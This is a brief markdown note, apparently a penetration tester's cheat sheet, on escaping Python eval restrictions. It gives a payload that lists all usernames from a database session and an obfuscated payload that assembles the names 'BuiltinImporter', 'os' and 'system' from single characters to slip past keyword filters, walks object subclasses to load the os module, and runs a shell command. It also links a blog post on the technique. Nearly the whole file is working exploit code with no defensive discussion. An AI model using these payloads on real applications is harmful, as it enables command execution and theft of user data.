# Python eval bypass

```python
print([u.username for u in db.session.query(User).all()])
```

https://netsec.expert/posts/breaking-python3-eval-protections/

```python
b = "B" + "u" + "i" + "l" + "t" + "i" + "n" + "I" + "m" + "p" + "o" + "r" + "t" + "e" + "r"  
o = "o" + "s"  
s = "s" + "y" + "s" + "t" + "e" + "m"  
  
for some_class in [].__class__.__base__.__subclasses__():  
    if some_class.__name__ == b:  
        o_mod = some_class().load_module(o)  
        getattr(o_mod, s)("id")
```